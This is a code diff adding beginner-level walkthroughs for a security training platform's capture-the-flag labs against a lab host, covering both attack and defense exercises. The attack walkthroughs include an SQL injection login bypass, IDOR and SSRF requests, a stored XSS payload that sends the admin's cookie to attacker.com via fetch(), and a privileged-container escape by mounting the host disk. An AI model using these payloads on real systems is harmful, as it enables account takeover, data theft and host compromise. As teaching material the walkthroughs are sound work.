@@ -437,5 +437,325 @@ export const LAB_DOCS = {
             { type: "subtitle", content: "Conclusion" },
             { type: "text", content: "Client-Side Authentication Bypass is a critical vulnerability caused by improper trust in client-side logic. Since client-side code can be easily manipulated, all authentication and authorization decisions must be handled securely on the server. During penetration testing, reviewing client-side logic is essential to identify this weakness." }
         ]
+    },
+    // Red Team Operational Walkthroughs (Starting at 101)
+    "101": {
+        title: "Walkthrough: Exposed Backup File",
+        sections: [
+            { type: "text", content: "Hey there, Ops! This challenge is all about a common developer mistake: leaving a backup file where everyone can see it. Let's find it step-by-step!" },
+            { type: "subtitle", content: "Step 1: Find the machine" },
+            { type: "text", content: "First, we need to make sure the target is awake. We use a tool called 'nmap'. It's like knocking on the door to see if anyone is home." },
+            {
+                type: "terminal",
+                command: "nmap http://target.local",
+                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
+            },
+            { type: "subtitle", content: "Step 2: Looking for the secret file" },
+            { type: "text", content: "Developers often name their backups something simple like 'backup.zip'. Let's ask the server if it has that file using 'curl'. Imagine 'curl' is like a grabby hand that reaches into the server." },
+            {
+                type: "terminal",
+                command: "curl http://target.local/backup.zip --output backup.zip",
+                output: "100% [================================================>] 2.4MB\n[+] Saved to backup.zip"
+            },
+            { type: "subtitle", content: "Step 3: Opening the present" },
+            { type: "text", content: "Now we have a zip file. We need to open it up! Use the 'unzip' command. It's like unboxing a package." },
+            {
+                type: "terminal",
+                command: "unzip backup.zip",
+                output: "extracting: config.php\nextracting: database.sql"
+            },
+            { type: "subtitle", content: "Step 4: Reading the secrets" },
+            { type: "text", content: "Inside we found 'config.php'. This is where the website keeps its deep secrets, like passwords. Use 'cat' to read it. 'cat' stands for concatenate, but we use it to peek inside files." },
+            {
+                type: "terminal",
+                command: "cat config.php",
+                output: "<?php\n$db_user = 'astranova_admin';\n$db_pass = 'Sup3rS3cretP@ss';\n$hidden_admin_path = '/admin/';"
+            },
+            { type: "subtitle", content: "Step 5: Entering the Admin Room" },
+            { type: "text", content: "Now use those credentials! Use 'curl' with the '-u' flag (stands for User) to say 'Hi, I'm the admin!'. The server will check your ID and give you the flag!" },
+            {
+                type: "terminal",
+                command: "curl -u astranova_admin:Sup3rS3cretP@ss http://target.local/admin/",
+                output: "Welcome Admin. FLAG{backup_exposure_mastered}"
+            }
+        ]
+    },
+    "Robots.txt Leak": {
+        title: "Walkthrough: Robots.txt Leak",
+        sections: [
+            { type: "text", content: "Websites have a file called 'robots.txt'. It's like a note left for Google bots saying 'Hey, please don't look here!'. But guess what? We can read that note too!" },
+            { type: "subtitle", content: "Step 1: Read the Note" },
+            { type: "text", content: "Use 'curl' to read the file. It's usually right in the front yard of the website." },
+            {
+                type: "terminal",
+                command: "curl http://target.local/robots.txt",
+                output: "User-agent: *\nDisallow: /super-secret-folder-99/"
+            },
+            { type: "subtitle", content: "Step 2: Go where you're not allowed" },
+            { type: "text", content: "The note said 'Disallow: /super-secret-folder-99/'. That sounds interesting! Let's go there anyway using our browser or curl." },
+            {
+                type: "terminal",
+                command: "curl http://target.local/super-secret-folder-99/",
+                output: "Welcome to the Private Stash.\n\nFLAG{robots_never_hide_secrets}"
+            }
+        ]
+    },
+    "SQL Injection Login Bypass": {
+        title: "Walkthrough: SQL Injection Bypass",
+        sections: [
+            { type: "text", content: "SQL Injection is like a mind-control trick for databases. We're going to use special symbols to make the database 'forget' to check our password. Let's start the mission!" },
+            { type: "subtitle", content: "Step 1: Check the Doors" },
+            { type: "text", content: "We'll use 'nmap' to see if the target allows web connections (Port 80)." },
+            {
+                type: "terminal",
+                command: "nmap http://target.local",
+                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
+            },
+            { type: "subtitle", content: "Step 2: Find the Entry Way" },
+            { type: "text", content: "We need a login page. We'll use 'gobuster' to scan for a login file." },
+            {
+                type: "terminal",
+                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
+                output: "/index.php            (Status: 200)\n/login.php            (Status: 200)\n/robots.txt           (Status: 200)"
+            },
+            { type: "subtitle", content: "Step 3: The 'Always True' Magic" },
+            { type: "text", content: "Now we go to 'login.php' and give it a special username: ' OR 1=1 --. In database language, 1 is always equal to 1, so the database says 'This is true, come on in!'" },
+            {
+                type: "terminal",
+                command: "curl -X POST -d \"user=' OR 1=1 --&pass=fake\" http://target.local/login.php",
+                output: "Welcome Admin! Authentication successful.\nFLAG{classic_sqli_bypass}"
+            }
+        ]
+    },
+    "IDOR - Insecure Direct Object Reference": {
+        title: "Walkthrough: IDOR Data Exposure",
+        sections: [
+            { type: "text", content: "Imagine a hotel where every room key is just a number. If you have key #105, you might be curious if key #1 works too! That's IDOR. Let's find some admin data." },
+            { type: "subtitle", content: "Step 1: Recon" },
+            { type: "text", content: "First, let's look for any hidden directories that might lead to an API." },
+            {
+                type: "terminal",
+                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
+                output: "/index.php            (Status: 200)\n/api                  (Status: 301)\n/assets               (Status: 301)"
+            },
+            { type: "subtitle", content: "Step 2: Peek at your own profile" },
+            { type: "text", content: "We found an '/api' folder. Let's see how the website asks for a user profile. It uses an ID number!" },
+            {
+                type: "terminal",
+                command: "curl http://target.local/api/user/v1/profile?id=105",
+                output: "{\"id\": 105, \"name\": \"User_105\", \"role\": \"customer\"}"
+            },
+            { type: "subtitle", content: "Step 3: Accessing the Admin's Room" },
+            { type: "text", content: "Usually, the very first user (ID 1) is the admin. Let's change our ID number to 1 and see if the server is tricked into giving us the admin's secret flag!" },
+            {
+                type: "terminal",
+                command: "curl http://target.local/api/user/v1/profile?id=1",
+                output: "{\"id\": 1, \"name\": \"astranova_root\", \"flag\": \"FLAG{idor_data_exposure}\"}"
+            }
+        ]
+    },
+    "Stored XSS → Admin Cookie Theft": {
+        title: "Walkthrough: Stored XSS Cookie Theft",
+        sections: [
+            { type: "text", content: "Stored XSS is a high-impact attack where we leave a malicious script permanently on the server. When an administrator views the data, our script runs in their browser and steals their session! Let's do this like a pro." },
+            { type: "subtitle", content: "Step 1: Initial Reconnaissance" },
+            { type: "text", content: "First, let's verify church target services are running. We'll use 'nmap' to scan for open ports." },
+            {
+                type: "terminal",
+                command: "nmap http://target.local",
+                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
+            },
+            { type: "subtitle", content: "Step 2: Hunting for Hidden Pages" },
+            { type: "text", content: "We know there's a website, but where can we submit data? We'll use 'gobuster' to find hidden files and directories." },
+            {
+                type: "terminal",
+                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
+                output: "/index.php            (Status: 200)\n/admin                (Status: 301)\n/contact.php          (Status: 200)\n/robots.txt           (Status: 200)"
+            },
+            { type: "subtitle", content: "Step 3: Planting the Payload" },
+            { type: "text", content: "The '/contact.php' page looks like a perfect place to leave a message. We'll inject a script that steals the admin's cookie and sends it to our 'attacker' server." },
+            {
+                type: "terminal",
+                command: "curl -X POST -d \"msg=<script>fetch('http://attacker.com?c=' + document.cookie)</script>\" http://target.local/contact.php",
+                output: "Message sent to admin successfully!"
+            },
+            { type: "subtitle", content: "Step 4: Checking the Harvest" },
+            { type: "text", content: "The admin has viewed your message! Their session cookie has been exfiltrated to your logs. Let's read the logs to get our prize." },
+            {
+                type: "terminal",
+                command: "cat /var/log/attacker_web.log",
+                output: "GET /?c=session_id=ASTRANOVA_SECRET_VAL;admin=true\nFLAG{persistent_xss_master}"
+            }
+        ]
+    },
+    "SSRF → Internal Service Access": {
+        title: "Walkthrough: SSRF Internal Breach",
+        sections: [
+            { type: "text", content: "SSRF (Server-Side Request Forgery) is like a 'Proxy Request'. We tell the server: 'Hey, fetch this webpage for me'. But instead of a public site, we trick it into looking at its own private internal files that are normally invisible to the public!" },
+            { type: "subtitle", content: "Step 1: Port Recon" },
+            { type: "text", content: "Let's see what's running on the target. We'll use 'nmap' to find open doors." },
+            {
+                type: "terminal",
+                command: "nmap http://target.local",
+                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
+            },
+            { type: "subtitle", content: "Step 2: Looking for Vulnerable Functions" },
+            { type: "text", content: "We need a page that 'fetches' content. Let's use 'gobuster' to find all hidden PHP files on the server." },
+            {
+                type: "terminal",
+                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
+                output: "/index.php            (Status: 200)\n/admin                (Status: 301)\n/fetch.php            (Status: 200)\n/robots.txt           (Status: 200)"
+            },
+            { type: "subtitle", content: "Step 3: Initial Testing" },
+            { type: "text", content: "The '/fetch.php' page seems to take a URL parameter. Let's try to make it fetch its own internal homepage (127.0.0.1) to see if it works!" },
+            {
+                type: "terminal",
+                command: "curl \"http://target.local/fetch.php?url=http://127.0.0.1/\"",
+                output: "Welcome to AstraNova Internal Portal.\n[Services]: /admin/internal_status, /config/view"
+            },
+            { type: "subtitle", content: "Step 4: Accessing the Forbidden Zone" },
+            { type: "text", content: "We found an internal service called '/admin/internal_status'. Since we are making the server call itself, it might trust us and show the flag!" },
+            {
+                type: "terminal",
+                command: "curl \"http://target.local/fetch.php?url=http://127.0.0.1/admin/internal_status\"",
+                output: "<h1>Internal Dashboard</h1><p>Status: All systems go.</p>\nFLAG{ssrf_internal_breach}"
+            }
+        ]
+    },
+    "Suspicious Log Analysis": {
+        title: "Walkthrough: Log Analysis",
+        sections: [
+            { type: "text", content: "Blue Teamers are like digital detectives. When something goes wrong, they check the 'Logs'—which are just the system's diary. Let's find an attacker!" },
+            { type: "subtitle", content: "Step 1: Open the System Diary" },
+            { type: "text", content: "We'll check the 'auth.log' file. This file records everyone who tries to log in. We'll use 'cat' to read it." },
+            {
+                type: "terminal",
+                command: "cat /var/log/auth.log",
+                output: "Feb 13 21:00:01 chakra sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2\nFeb 13 21:00:05 chakra sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2\n..."
+            },
+            { type: "subtitle", content: "Step 2: Identify the Attacker" },
+            { type: "text", content: "See that IP address '192.168.1.105'? It's trying to guess the password over and over again! That is our attacker's IP address. Submit it to pass the challenge!" }
+        ]
+    },
+    "Unsecured File Permissions": {
+        title: "Walkthrough: File Permissions",
+        sections: [
+            { type: "text", content: "One of the most common mistakes is leaving sensitive data visible to everyone. Let's check our scripts folder for loose permissions!" },
+            { type: "subtitle", content: "Step 1: Inspect the scripts folder" },
+            { type: "text", content: "Navigate to 'scripts' and use 'ls -l' to see who can read or write to the files." },
+            {
+                type: "terminal",
+                command: "cd scripts && ls -l",
+                output: "-rwxr-xr-x 1 chakra chakra   85 Feb 13 22:10 health_check.sh\n-rw-rw-rw- 1 chakra chakra  120 Feb 13 22:15 backup_config.php"
+            },
+            { type: "subtitle", content: "Step 2: Find the Data Leak" },
+            { type: "text", content: "The 'backup_config.php' file has 'rw-rw-rw-' permissions—that means anyone on the system can read and write to it! Let's read it to see what's exposed." },
+            {
+                type: "terminal",
+                command: "cat backup_config.php",
+                output: "<?php\n// Internal Backup Script\n$db_pass = 'CHAKRA_DEFENDER{config_permission_tightened}';\n?>"
+            }
+        ]
+    },
+    "Malicious Process Hunting": {
+        title: "Walkthrough: Process Hunting",
+        sections: [
+            { type: "text", content: "Sometimes, bad guys try to hide secret scripts on your computer to steal your power. We need to find them and stop them!" },
+            { type: "subtitle", content: "Step 1: Check what's running" },
+            { type: "text", content: "We use the 'ps' command to see a list of everything the computer is doing right now." },
+            {
+                type: "terminal",
+                command: "ps aux",
+                output: "USER       PID  %CPU %MEM    COMMAND\nroot         1   0.0  0.1    /sbin/init\nchakra     502   0.0  0.2    /bin/bash\nchakra     999  98.2  0.5    ./xmrig_miner"
+            },
+            { type: "subtitle", content: "Step 2: Find the Thief" },
+            { type: "text", content: "Look at PID 999. It's using 98% of the CPU! That's a 'miner'—it's stealing our computer's power. Let's kill it!" },
+            {
+                type: "terminal",
+                command: "kill 999",
+                output: "Process 999 terminated.\nCHAKRA_DEFENDER{miner_terminated_successfully}"
+            }
+        ]
+    },
+    "Digital Forensics: Hidden Backdoor": {
+        title: "Walkthrough: Digital Forensics",
+        sections: [
+            { type: "text", content: "Hackers love to hide their tools in messy closets like the '/tmp' folder. Let's go investigating!" },
+            { type: "subtitle", content: "Step 1: Look in the closet" },
+            { type: "text", content: "Navigate to the '/tmp' folder and use 'ls -la' to see everything, even the hidden files (files starting with a dot)." },
+            {
+                type: "terminal",
+                command: "cd /tmp && ls -la",
+                output: "drwxrwxrwt  2 root   root   4096 Feb 13 22:00 .\ndrwxr-xr-x 20 root   root   4096 Feb 13 21:00 ..\n-rwxr-xr-x  1 hacker hacker  205 Feb 13 21:15 .hidden_backdoor.sh"
+            },
+            { type: "subtitle", content: "Step 2: Peek inside the backdoor" },
+            { type: "text", content: "We found '.hidden_backdoor.sh'. Let's see what it does. Reading it will reveal the heart of the hack!" },
+            {
+                type: "terminal",
+                command: "cat .hidden_backdoor.sh",
+                output: "#!/bin/bash\n# I'm staying here forever!\n# CHAKRA_DEFENDER{forensics_backdoor_found}"
+            }
+        ]
+    },
+    "Incident 47 – The Phantom Beacon": {
+        title: "Walkthrough: The Phantom Beacon",
+        sections: [
+            { type: "text", content: "Welcome, Analyst. A workstation is reaching out to a suspicious server every 30 seconds. This is a classic 'C2 Beacon'. Let's find the infected machine and the stolen data." },
+            { type: "subtitle", content: "Step 1: Identifying the Beacon" },
+            { type: "text", content: "Check the 'firewall.log'. Look for a specific IP address that makes a connection at exactly the same time interval repeatedly." },
+            {
+                type: "terminal",
+                command: "cat logs/firewall.log",
+                output: "2026-04-12 09:14:02 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443\n2026-04-12 09:14:32 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443\n2026-04-12 09:15:02 ALLOW TCP 192.168.1.23 -> 34.77.182.91:443"
+            },
+            { type: "subtitle", content: "Step 2: Uncovering the C2 Domain" },
+            { type: "text", content: "Now check the 'proxy.log' to see what website that IP was visiting at those exact times." },
+            {
+                type: "terminal",
+                command: "cat logs/proxy.log",
+                output: "2026-04-12 09:14:02 GET https://cdn-security-update.com/checkin\n2026-04-12 09:14:32 GET https://cdn-security-update.com/checkin"
+            },
+            { type: "subtitle", content: "Step 3: Timeline of Compromise" },
+            { type: "text", content: "Check 'auth.log' to see when the malware was first executed on that workstation." },
+            {
+                type: "terminal",
+                command: "cat logs/auth.log",
+                output: "Apr 12 09:12:48 workstation-23 user john executed /tmp/update.sh\nApr 12 09:12:50 workstation-23 user john executed /tmp/beacon"
+            },
+            { type: "subtitle", content: "Step 4: Recovering the Secret Key" },
+            { type: "text", content: "The attacker exfiltrated a secret key inside a network packet. Use 'strings' to look for the 'data=' field in the PCAP file, then decode it from Base64." },
+            {
+                type: "terminal",
+                command: "strings capture/suspicious_traffic.pcap | grep data=",
+                output: "data=U0VDUkVUX0tFWV9YT1IxMjM="
+            },
+            {
+                type: "terminal",
+                command: "echo U0VDUkVUX0tFWV9YT1IxMjM= | base64 -d",
+                output: "FLAG{192.168.1.23_cdn-security-update.com_SECRET_KEY_XOR123}"
+            },
+            { type: "subtitle", content: "Mission Success: Extract Final Flag" },
+            { type: "text", content: "Great work, Analyst! Combine the evidence to form the final flag:\n\n**FLAG{192.168.1.23_cdn-security-update.com_SECRET_KEY_XOR123}**" }
+        ]
+    },
+    "Stored XSS → Admin Panel → Docker Escape": {
+        title: "Walkthrough: The Ultimate Chain",
+        sections: [
+            { type: "text", content: "This is a 4-stage attack: XSS to steal cookies, hijacking an admin, command injection, and escaping a privileged container to root the host." },
+            { type: "subtitle", content: "Step 1: Steal the Session" },
+            { type: "text", content: "Submit a support ticket with an XSS payload. When the admin opens it, their session token is sent to your logger." },
+            {
+                type: "terminal",
+                command: "cat /var/log/attacker/cookies.log",
+                output: "astranova_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+            },
+            { type: "subtitle", content: "Step 2: Docker Escape" },
+            { type: "text", content: "Inject a command into the diagnostic tool to get a shell. Since the container is privileged, you can mount the host's hard drive." },
+            {
+                type: "terminal",
+                command: "mount /dev/sda1 /mnt && cat /mnt/root/flag.txt",
+                output: "FLAG{xss_to_docker_escape_privileged_root}"
+            }
+        ]
     }
 };
